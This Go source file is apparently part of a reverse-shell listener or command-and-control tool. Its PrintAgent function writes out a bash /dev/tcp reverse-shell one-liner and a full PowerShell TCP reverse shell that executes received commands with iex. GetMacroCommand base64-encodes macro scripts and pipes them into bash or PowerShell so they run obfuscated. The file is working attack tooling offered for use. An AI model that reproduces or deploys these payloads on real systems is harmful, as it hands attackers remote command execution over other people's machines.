package agents

import (
	"encoding/base64"
	"log"
	"os"
	"path/filepath"
	"strings"
)

func PrintAgent(bind string) (string, string) {
	//split bind into ip and port
	ip := strings.Split(bind, ":")[0]
	port := strings.Split(bind, ":")[1]
	if ip == "localhost" {
		ip = "127.0.0.1"
	}
	var cmd = "sh -i >& /dev/tcp/" + string(ip) + "/" + string(port) + " 0>&1"

	var cmd_win = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""

	return cmd, cmd_win

}

func GetMacroCommands() []string {
	path, err := os.Getwd()
	if err != nil {
		log.Println(err)
	}
	path = path + "../../../internal/agents/macros"
	path, _ = filepath.Abs(path)

	files, err := os.ReadDir(path + "/lin")
	if err != nil {
		panic(err)
	}
	// for now just print the file names
	var commands []string
	for _, file := range files {
		commands = append(commands, "lin/"+file.Name())
	}

	files, err = os.ReadDir(path + "/win")
	if err != nil {
		panic(err)
	}

	for _, file := range files {
		commands = append(commands, "win/"+file.Name())
	}

	log.Println(commands)
	return commands
}

func GetMacroCommand(command string) string {
	path, err := os.Getwd()
	if err != nil {
		log.Println(err)
	}
	path = path + "../../../internal/agents/macros"
	path, _ = filepath.Abs(path)

	content, err := os.ReadFile(path + "/" + command)

	lines := strings.Split(string(content), "\n")
	var newContent string
	for _, line := range lines {
		if !strings.HasPrefix(line, "#") {
			newContent += line + "\n"
		}
	}
	content = []byte(newContent)

	if strings.HasPrefix(command, "lin") {
		content = []byte("echo " + base64.StdEncoding.EncodeToString(content) + " | base64 -d | bash")
	} else {
		content = []byte("echo " + base64.StdEncoding.EncodeToString(content) + " | base64 -d | powershell -nop -")
	}

	if err != nil {
		panic(err)
	}
	return string(content)
}

func GetAllCommands() []string {
	var commands []string
	commands = append(commands, "send")
	commands = append(commands, "lock")
	commands = append(commands, "unlock")
	commands = append(commands, "tl")
	commands = append(commands, "cl")
	commands = append(commands, "lst")
	commands = append(commands, "lsc")
	commands = append(commands, "rmt")
	commands = append(commands, "rmc")
	commands = append(commands, GetMacroCommands()...)
	return commands
}
